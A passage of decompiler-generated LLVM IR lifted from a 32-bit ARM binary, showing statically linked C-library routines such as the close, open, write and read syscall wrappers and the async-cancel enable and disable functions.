  %v2_13f34 = icmp eq i32 %v2_13f30, 0
  br i1 %v2_13f34, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_13f48 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_13f48, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_13f58 = load i32, i32* %stack_var_-40, align 4
  %v1_13f5c = and i32 %v3_13f58, 65536
  store i32 %v1_13f5c, i32* %r2.global-to-local, align 4
  %v2_13f5c = icmp eq i32 %v1_13f5c, 0
  br i1 %v2_13f5c, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_13f64 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_13f64, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_13f5c, i32 ptrtoint (i32* @global_var_10c28.484 to i32))
  br label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13e80, %.thread5
  %v0_13f6c = load i32, i32* @r4, align 4
  store i32 %v3_13e5c, i32* @r4, align 4
  store i32 %v6_13e5c, i32* @r5, align 4
  store i32 %v9_13e5c, i32* @r6, align 4
  store i32 %v12_13e5c, i32* @r7, align 4
  store i32 %v15_13e5c, i32* @lr, align 4
  ret i32 %v0_13f6c

; uselistorder directives
  uselistorder i32 %v0_13ed4, { 1, 0 }
  uselistorder i32 %v1_13eb8.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f6c, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13ef4, { 1, 0 }
  uselistorder label %dec_label_pc_13ed8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13ec0, { 1, 0 }
}

define i32 @function_13f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_13f80:
  %v0_13f80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13f80, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13f80
  %v2_13f80 = load i32, i32* @r4, align 4
  %v4_13f80 = lshr i32 %v2_13f80, %arg1
  %v5_13f80 = sub i32 32, %arg1
  %v6_13f80 = shl i32 %v2_13f80, %v5_13f80
  %v7_13f80 = or i32 %v6_13f80, %v4_13f80
  %v9_13f80 = and i32 %v7_13f80, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13f80, %bb
  %v0_13f84 = phi i32 [ %arg1, %dec_label_pc_13f80 ], [ %v9_13f80, %bb ]
  ret i32 %v0_13f84

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_13fa4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_13fa4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_13fa4 = load i32, i32* @r0, align 4
  ret i32 %v2_13fa4

bb1:                                              ; preds = %entry
  %v0_13fa8 = call i32 @__syscall_error()
  ret i32 %v0_13fa8
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13fb4 = load i32, i32* @global_var_2487c.487, align 4
  %v2_13fb8 = icmp eq i32 %v3_13fb4, 0
  store i1 %v2_13fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fb8, label %dec_label_pc_13fc0, label %entry.dec_label_pc_13fdc_crit_edge

entry.dec_label_pc_13fdc_crit_edge:               ; preds = %entry
  %v3_13fdc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13fc0:                               ; preds = %entry
  %v0_13fc0 = load i32, i32* @r7, align 4
  store i32 %v0_13fc0, i32* @ip, align 4
  %v0_13fd0 = load i32, i32* @r0, align 4
  %v2_13fd0 = icmp ugt i32 %v0_13fd0, -4097
  %v7_13fd0 = icmp eq i32 %v0_13fd0, -4096
  store i1 %v7_13fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fd0, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_13fdc, %dec_label_pc_13fc0
  %merge = phi i32 [ %v0_13fd0, %dec_label_pc_13fc0 ], [ %v0_14000, %dec_label_pc_13fdc ], [ %v0_14010, %bb8 ], [ %v9_14020, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_13fc0
  %v0_13fd8 = call i32 @__syscall_error()
  br label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %entry.dec_label_pc_13fdc_crit_edge, %bb7
  %v3_13fdc = phi i32 [ %v3_13fdc.pre, %entry.dec_label_pc_13fdc_crit_edge ], [ %v0_13fd8, %bb7 ]
  %v9_13fdc = load i32, i32* @r7, align 4
  store i32 %v9_13fdc, i32* %stack_var_-8, align 4
  %v12_13fdc = load i32, i32* @lr, align 4
  %v0_13fe0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13fe0, i32* @ip, align 4
  store i32 %v3_13fdc, i32* @r7, align 4
  %v1_13ffc = call i32 @__libc_disable_asynccancel(i32 %v0_13fe0)
  %v0_14000 = load i32, i32* @r7, align 4
  store i32 %v0_14000, i32* @r0, align 4
  %v2_14004 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14004, i32* @r7, align 4
  store i32 %v12_13fdc, i32* @lr, align 4
  %v2_14008 = icmp ugt i32 %v0_14000, -4097
  %v7_14008 = icmp eq i32 %v0_14000, -4096
  store i1 %v7_14008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14008, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_13fdc
  %v0_14010 = call i32 @__syscall_error()
  %v0_14020 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14020, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_14020 = load i32, i32* @r1, align 4
  %v3_14020 = load i32, i32* @r8, align 4
  %v8_14020 = lshr i32 %v0_14010, %v3_14020
  %v9_14020 = and i32 %v8_14020, %v1_14020
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14010, { 1, 0 }
  uselistorder i32 %v0_14000, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13fd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fdc, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_14034 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14034, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14034 = load i32, i32* @r0, align 4
  ret i32 %v2_14034

bb1:                                              ; preds = %entry
  %v0_14038 = call i32 @__syscall_error()
  ret i32 %v0_14038
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14044 = load i32, i32* @global_var_2487c.487, align 4
  %v2_14048 = icmp eq i32 %v3_14044, 0
  store i1 %v2_14048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14048, label %dec_label_pc_14050, label %entry.dec_label_pc_1406c_crit_edge

entry.dec_label_pc_1406c_crit_edge:               ; preds = %entry
  %v3_1406c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1406c

dec_label_pc_14050:                               ; preds = %entry
  %v0_14060 = load i32, i32* @r0, align 4
  %v2_14060 = icmp ugt i32 %v0_14060, -4097
  %v7_14060 = icmp eq i32 %v0_14060, -4096
  store i1 %v7_14060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14060, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1406c, %dec_label_pc_14050
  %merge = phi i32 [ %v0_14060, %dec_label_pc_14050 ], [ %v0_14090, %dec_label_pc_1406c ], [ %v0_140a0, %bb10 ], [ %v6_140b0, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14050
  %v0_14068 = call i32 @__syscall_error()
  br label %dec_label_pc_1406c

dec_label_pc_1406c:                               ; preds = %entry.dec_label_pc_1406c_crit_edge, %bb9
  %v3_1406c = phi i32 [ %v3_1406c.pre, %entry.dec_label_pc_1406c_crit_edge ], [ %v0_14068, %bb9 ]
  store i32 %v3_1406c, i32* %stack_var_-24, align 4
  %v9_1406c = load i32, i32* @r2, align 4
  %v12_1406c = load i32, i32* @r3, align 4
  %v15_1406c = load i32, i32* @r7, align 4
  store i32 %v15_1406c, i32* %stack_var_-8, align 4
  %v18_1406c = load i32, i32* @lr, align 4
  %v0_14070 = call i32 @__libc_enable_asynccancel()
  %v2_14078 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1406c, i32* @r2, align 4
  store i32 %v12_1406c, i32* @r3, align 4
  store i32 %v2_14078, i32* @r7, align 4
  %v1_1408c = call i32 @__libc_disable_asynccancel(i32 %v0_14070)
  %v0_14090 = load i32, i32* @r7, align 4
  store i32 %v0_14090, i32* @r0, align 4
  %v2_14094 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14094, i32* @r7, align 4
  store i32 %v18_1406c, i32* @lr, align 4
  %v2_14098 = icmp ugt i32 %v0_14090, -4097
  %v7_14098 = icmp eq i32 %v0_14090, -4096
  store i1 %v7_14098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14098, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1406c
  %v0_140a0 = call i32 @__syscall_error()
  %v0_140b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140b0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_140b0 = load i32, i32* @r1, align 4
  %v5_140b0 = udiv i32 %v0_140a0, 32768
  %v6_140b0 = and i32 %v1_140b0, %v5_140b0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14090, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14060, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1406c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_140c4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_140c4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_140c4 = load i32, i32* @r0, align 4
  ret i32 %v2_140c4

bb1:                                              ; preds = %entry
  %v0_140c8 = call i32 @__syscall_error()
  ret i32 %v0_140c8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140d4 = load i32, i32* @global_var_2487c.487, align 4
  %v2_140d8 = icmp eq i32 %v3_140d4, 0
  store i1 %v2_140d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140d8, label %dec_label_pc_140e0, label %entry.dec_label_pc_140fc_crit_edge

entry.dec_label_pc_140fc_crit_edge:               ; preds = %entry
  %v3_140fc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_140fc

dec_label_pc_140e0:                               ; preds = %entry
  %v0_140f0 = load i32, i32* @r0, align 4
  %v2_140f0 = icmp ugt i32 %v0_140f0, -4097
  %v7_140f0 = icmp eq i32 %v0_140f0, -4096
  store i1 %v7_140f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140f0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_140fc, %dec_label_pc_140e0
  %merge = phi i32 [ %v0_140f0, %dec_label_pc_140e0 ], [ %v0_14120, %dec_label_pc_140fc ], [ %v0_14130, %bb10 ], [ %v9_14140, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_140e0
  %v0_140f8 = call i32 @__syscall_error()
  br label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %entry.dec_label_pc_140fc_crit_edge, %bb9
  %v3_140fc = phi i32 [ %v3_140fc.pre, %entry.dec_label_pc_140fc_crit_edge ], [ %v0_140f8, %bb9 ]
  %v12_140fc = load i32, i32* @r3, align 4
  %v15_140fc = load i32, i32* @r7, align 4
  store i32 %v15_140fc, i32* %stack_var_-8, align 4
  %v18_140fc = load i32, i32* @lr, align 4
  %v0_14100 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_140fc, i32* @r3, align 4
  store i32 %v3_140fc, i32* @r7, align 4
  %v1_1411c = call i32 @__libc_disable_asynccancel(i32 %v0_14100)
  %v0_14120 = load i32, i32* @r7, align 4
  store i32 %v0_14120, i32* @r0, align 4
  %v2_14124 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14124, i32* @r7, align 4
  store i32 %v18_140fc, i32* @lr, align 4
  %v2_14128 = icmp ugt i32 %v0_14120, -4097
  %v7_14128 = icmp eq i32 %v0_14120, -4096
  store i1 %v7_14128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14128, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_140fc
  %v0_14130 = call i32 @__syscall_error()
  %v0_14140 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14140, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14140 = load i32, i32* @r1, align 4
  %v3_14140 = load i32, i32* @r7, align 4
  %v8_14140 = shl i32 %v0_14130, %v3_14140
  %v9_14140 = and i32 %v8_14140, %v1_14140
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14130, { 1, 0 }
  uselistorder i32 %v0_14120, { 0, 2, 3, 1 }
  uselistorder i32 %v0_140f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_140fc, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_14154 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14154, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14154 = load i32, i32* @r0, align 4
  ret i32 %v2_14154

bb1:                                              ; preds = %entry
  %v0_14158 = call i32 @__syscall_error()
  ret i32 %v0_14158

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14164 = load i32, i32* @global_var_2487c.487, align 4
  %v2_14168 = icmp eq i32 %v3_14164, 0
  br i1 %v2_14168, label %dec_label_pc_14170, label %entry.dec_label_pc_1418c_crit_edge

entry.dec_label_pc_1418c_crit_edge:               ; preds = %entry
  %v3_1418c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1418c

dec_label_pc_14170:                               ; preds = %entry
  %v0_14180 = load i32, i32* @r0, align 4
  %v2_14180 = icmp ugt i32 %v0_14180, -4097
  br i1 %v2_14180, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1418c, %dec_label_pc_14170
  %merge = phi i32 [ %v0_14180, %dec_label_pc_14170 ], [ %v0_141b0, %dec_label_pc_1418c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_14170
  %v0_14188 = call i32 @__syscall_error()
  br label %dec_label_pc_1418c

dec_label_pc_1418c:                               ; preds = %entry.dec_label_pc_1418c_crit_edge, %bb8
  %v3_1418c = phi i32 [ %v3_1418c.pre, %entry.dec_label_pc_1418c_crit_edge ], [ %v0_14188, %bb8 ]
  store i32 %v3_1418c, i32* %stack_var_-24, align 4
  %v6_1418c = load i32, i32* @r1, align 4
  %v12_1418c = load i32, i32* @r3, align 4
  %v15_1418c = load i32, i32* @r7, align 4
  store i32 %v15_1418c, i32* %stack_var_-8, align 4
  %v18_1418c = load i32, i32* @lr, align 4
  %v0_14190 = call i32 @__libc_enable_asynccancel()
  %v2_14198 = load i32, i32* %stack_var_-24, align 4
  store i32 %v6_1418c, i32* @r1, align 4
  store i32 %v12_1418c, i32* @r3, align 4
  store i32 %v2_14198, i32* @r7, align 4
  %v1_141ac = call i32 @__libc_disable_asynccancel(i32 %v0_14190)
  %v0_141b0 = load i32, i32* @r7, align 4
  store i32 %v0_141b0, i32* @r0, align 4
  %v2_141b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_141b4, i32* @r7, align 4
  store i32 %v18_1418c, i32* @lr, align 4
  %v2_141b8 = icmp ugt i32 %v0_141b0, -4097
  br i1 %v2_141b8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1418c
  %v0_141c0 = call i32 @__syscall_error()
  ret i32 %v0_141c0

; uselistorder directives
  uselistorder i32 %v0_141b0, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 3, 2, 11, 7, 6, 10, 1, 0, 9, 5, 4, 8 }
  uselistorder label %dec_label_pc_1418c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_141d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_141d0 = and i32 %v0_141d0, 2
  %v2_141d0 = icmp eq i32 %v1_141d0, 0
  %v3_141d4 = load i32, i32* @r4, align 4
  store i32 %v3_141d4, i32* %stack_var_-16, align 4
  br i1 %v2_141d0, label %dec_label_pc_141dc, label %dec_label_pc_14250

dec_label_pc_141dc:                               ; preds = %entry
  %v0_141dc = call i32 @__aeabi_read_tp()
  store i32 %v0_141dc, i32* %r0.global-to-local, align 4
  %v1_141e0 = add i32 %v0_141dc, -1036
  %v2_141e0 = inttoptr i32 %v1_141e0 to i32*
  %v3_141e0 = load i32, i32* %v2_141e0, align 4
  %v1_141e4 = add i32 %v0_141dc, -1168
  store i32 %v1_141e4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_141e8

dec_label_pc_141e8:                               ; preds = %dec_label_pc_1421c.dec_label_pc_141e8_crit_edge, %dec_label_pc_141dc
  %v0_141f4 = phi i32 [ %v0_141f4.pre, %dec_label_pc_1421c.dec_label_pc_141e8_crit_edge ], [ %v1_141e4, %dec_label_pc_141dc ]
  %v0_141e8 = phi i32 [ %v0_1421c, %dec_label_pc_1421c.dec_label_pc_141e8_crit_edge ], [ %v3_141e0, %dec_label_pc_141dc ]
  %v1_141e8 = and i32 %v0_141e8, -3
  store i32 %v1_141e8, i32* %r7.global-to-local, align 4
  store i32 %v0_141e8, i32* %r4.global-to-local, align 4
  store i32 %v1_141e8, i32* @r1, align 4
  %v1_141f4 = add i32 %v0_141f4, 132
  store i32 %v1_141f4, i32* @r2, align 4
  %v1_141f823 = inttoptr i32 %v1_141f4 to i32*
  %v2_141f824 = load i32, i32* %v1_141f823, align 4
  %v3_141fc26 = icmp uge i32 %v2_141f824, %v0_141e8
  store i1 %v3_141fc26, i1* %cpsr_c.global-to-local, align 1
  %v9_141fc32 = icmp eq i32 %v2_141f824, %v0_141e8
  br i1 %v9_141fc32, label %dec_label_pc_14204, label %dec_label_pc_1421c

dec_label_pc_14204:                               ; preds = %dec_label_pc_141e8, %dec_label_pc_14204.dec_label_pc_141f8_crit_edge
  %v0_1420433 = phi i32 [ %v1_141fc.pre, %dec_label_pc_14204.dec_label_pc_141f8_crit_edge ], [ %v0_141e8, %dec_label_pc_141e8 ]
  store i32 %v0_1420433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14214 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14214, label %dec_label_pc_14218, label %dec_label_pc_14204.dec_label_pc_141f8_crit_edge

dec_label_pc_14204.dec_label_pc_141f8_crit_edge:  ; preds = %dec_label_pc_14204
  %v0_141f8.pre = load i32, i32* @r2, align 4
  %v1_141fc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_141f8 = inttoptr i32 %v0_141f8.pre to i32*
  %v2_141f8 = load i32, i32* %v1_141f8, align 4
  %v3_141fc = icmp uge i32 %v2_141f8, %v1_141fc.pre
  store i1 %v3_141fc, i1* %cpsr_c.global-to-local, align 1
  %v9_141fc = icmp eq i32 %v2_141f8, %v1_141fc.pre
  br i1 %v9_141fc, label %dec_label_pc_14204, label %dec_label_pc_1421c

dec_label_pc_14218:                               ; preds = %dec_label_pc_14204
  %v0_14218 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %dec_label_pc_141e8, %dec_label_pc_14204.dec_label_pc_141f8_crit_edge, %dec_label_pc_14218
  %v0_1421c = phi i32 [ %v0_14218, %dec_label_pc_14218 ], [ %v2_141f824, %dec_label_pc_141e8 ], [ %v2_141f8, %dec_label_pc_14204.dec_label_pc_141f8_crit_edge ]
  %v1_1421c = phi i32 [ %v0_14218, %dec_label_pc_14218 ], [ %v0_141e8, %dec_label_pc_141e8 ], [ %v1_141fc.pre, %dec_label_pc_14204.dec_label_pc_141f8_crit_edge ]
  %v3_1421c = icmp uge i32 %v0_1421c, %v1_1421c
  store i1 %v3_1421c, i1* %cpsr_c.global-to-local, align 1
  %v9_1421c = icmp eq i32 %v0_1421c, %v1_1421c
  br i1 %v9_1421c, label %dec_label_pc_14244.preheader, label %dec_label_pc_1421c.dec_label_pc_141e8_crit_edge

dec_label_pc_1421c.dec_label_pc_141e8_crit_edge:  ; preds = %dec_label_pc_1421c
  %v0_141f4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_141e8

dec_label_pc_14244.preheader:                     ; preds = %dec_label_pc_1421c
  %v0_142441 = load i32, i32* %r7.global-to-local, align 4
  %v1_142442 = and i32 %v0_142441, 12
  store i32 %v1_142442, i32* @r3, align 4
  %v2_142483 = icmp ugt i32 %v1_142442, 3
  store i1 %v2_142483, i1* %cpsr_c.global-to-local, align 1
  %v7_142485 = icmp eq i32 %v1_142442, 4
  br i1 %v7_142485, label %dec_label_pc_14228.lr.ph, label %dec_label_pc_14244.preheader.dec_label_pc_14250.loopexit_crit_edge

dec_label_pc_14244.preheader.dec_label_pc_14250.loopexit_crit_edge: ; preds = %dec_label_pc_14244.preheader
  %v1_14254.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14250.loopexit

dec_label_pc_14228.lr.ph:                         ; preds = %dec_label_pc_14244.preheader
  %v0_1422c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1422c = add i32 %v0_1422c.pre, 132
  %v2_14240 = inttoptr i32 %v1_1422c to i32*
  br label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %dec_label_pc_14228.lr.ph, %dec_label_pc_14228
  %v0_14228 = phi i32 [ %v0_142441, %dec_label_pc_14228.lr.ph ], [ %v3_14240, %dec_label_pc_14228 ]
  store i32 %v0_14228, i32* @r2, align 4
  store i32 %v1_1422c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_14240 = load i32, i32* %v2_14240, align 4
  store i32 %v3_14240, i32* %r7.global-to-local, align 4
  %v1_14244 = and i32 %v3_14240, 12
  store i32 %v1_14244, i32* @r3, align 4
  %v7_14248 = icmp eq i32 %v1_14244, 4
  br i1 %v7_14248, label %dec_label_pc_14228, label %dec_label_pc_14244.dec_label_pc_14250.loopexit_crit_edge

dec_label_pc_14244.dec_label_pc_14250.loopexit_crit_edge: ; preds = %dec_label_pc_14228
  %v2_14248 = icmp ugt i32 %v1_14244, 3
  store i1 %v2_14248, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_14250.loopexit

dec_label_pc_14250.loopexit:                      ; preds = %dec_label_pc_14244.preheader.dec_label_pc_14250.loopexit_crit_edge, %dec_label_pc_14244.dec_label_pc_14250.loopexit_crit_edge
  %v1_14254.pre = phi i32 [ %v1_14254.pre.pre, %dec_label_pc_14244.preheader.dec_label_pc_14250.loopexit_crit_edge ], [ %v1_1422c, %dec_label_pc_14244.dec_label_pc_14250.loopexit_crit_edge ]
  %v2_14250.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_14250.loopexit, %entry
  %v1_14254 = phi i32 [ %v1_14254.pre, %dec_label_pc_14250.loopexit ], [ %v0_141d0, %entry ]
  %v2_14250 = phi i32 [ %v2_14250.pre, %dec_label_pc_14250.loopexit ], [ %v3_141d4, %entry ]
  store i32 %v2_14250, i32* @r4, align 4
  ret i32 %v1_14254

; uselistorder directives
  uselistorder i32 %v3_14240, { 1, 2, 0 }
  uselistorder i32 %v1_1422c, { 0, 2, 1 }
  uselistorder i32 %v0_14218, { 1, 0 }
  uselistorder i32 %v1_141fc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_141e8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_14250.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14228, { 1, 0 }
  uselistorder label %dec_label_pc_1421c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14204, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14258 = load i32, i32* @r4, align 4
  store i32 %v3_14258, i32* %stack_var_-24, align 4
  store i32 ptrtoint (i32* @global_var_d420.492 to i32), i32* %r8.global-to-local, align 4
  %v0_14260 = call i32 @__aeabi_read_tp()
  %v1_14264 = add i32 %v0_14260, -1036
  %v2_14264 = inttoptr i32 %v1_14264 to i32*
  %v3_14264 = load i32, i32* %v2_14264, align 4
  store i32 %v3_14264, i32* %r6.global-to-local, align 4
  %v1_14268 = add i32 %v0_14260, -1168
  store i32 %v1_14268, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r8.global-to-local, align 4
  %v1_1427046 = or i32 %v3_14264, 2
  store i32 %v1_1427046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1427449 = icmp eq i32 %v1_1427046, %v3_14264
  br i1 %v9_1427449, label %dec_label_pc_14320, label %dec_label_pc_1427c

dec_label_pc_1427c:                               ; preds = %entry, %bb.dec_label_pc_1427c_crit_edge
  %v0_14280 = phi i32 [ %v0_14280.pre, %bb.dec_label_pc_1427c_crit_edge ], [ %v1_14268, %entry ]
  %v1_1427051 = phi i32 [ %v1_14270, %bb.dec_label_pc_1427c_crit_edge ], [ %v1_1427046, %entry ]
  %v0_1428450 = phi i32 [ %v1_142b0, %bb.dec_label_pc_1427c_crit_edge ], [ %v3_14264, %entry ]
  store i32 %v1_1427051, i32* @r1, align 4
  %v1_14280 = add i32 %v0_14280, 132
  store i32 %v1_14280, i32* @r2, align 4
  store i32 %v0_1428450, i32* %r4.global-to-local, align 4
  %v1_1428834 = inttoptr i32 %v1_14280 to i32*
  %v2_1428835 = load i32, i32* %v1_1428834, align 4
  store i32 %v2_1428835, i32* @r3, align 4
  %v3_1428c37 = icmp uge i32 %v2_1428835, %v0_1428450
  store i1 %v3_1428c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1428c43 = icmp eq i32 %v2_1428835, %v0_1428450
  br i1 %v9_1428c43, label %dec_label_pc_14294, label %dec_label_pc_142ac

dec_label_pc_14294:                               ; preds = %dec_label_pc_1427c, %dec_label_pc_14294.dec_label_pc_14288_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_142a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_142a4, label %dec_label_pc_142a8, label %dec_label_pc_14294.dec_label_pc_14288_crit_edge

dec_label_pc_14294.dec_label_pc_14288_crit_edge:  ; preds = %dec_label_pc_14294
  %v0_14288.pre = load i32, i32* @r2, align 4
  %v1_1428c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14288 = inttoptr i32 %v0_14288.pre to i32*
  %v2_14288 = load i32, i32* %v1_14288, align 4
  store i32 %v2_14288, i32* @r3, align 4
  %v3_1428c = icmp uge i32 %v2_14288, %v1_1428c.pre
  store i1 %v3_1428c, i1* %cpsr_c.global-to-local, align 1
  %v9_1428c = icmp eq i32 %v2_14288, %v1_1428c.pre
